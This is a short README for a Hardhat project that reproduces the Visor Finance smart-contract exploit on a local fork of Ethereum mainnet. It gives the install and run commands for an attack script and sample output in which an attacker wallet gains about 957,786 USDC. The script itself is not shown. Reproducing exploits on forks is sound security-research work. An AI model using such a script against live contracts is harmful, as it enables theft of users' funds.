# Visor exploit

## How to run

Install nodejs/npm first

Set up the `forking url` (in `hardhat.config.ts`)

e.g. https://speedy-nodes-nyc.moralis.io/xxxxxxxxxxx/eth/mainnet/archive (
You need to apply for speedy-nodes from moralis.io)

Then run
```bash
npm install
npx hardhat run scripts/attack.ts
```
You will see similar output later
```
Attacker USDC balance: 0.0
Exploiting... transcation:  0x00ce9e37ea3fb76f861cf0bc114c2d5314acd880a40f0f72d1b1292b72e4db29
Exploit complete.
Attacker USDC balance: 957786.585605
```
This means the attack is complete
> The block height of the fork is 14326931


## Link

* https://twitter.com/peckshield/status/1500105933128495108
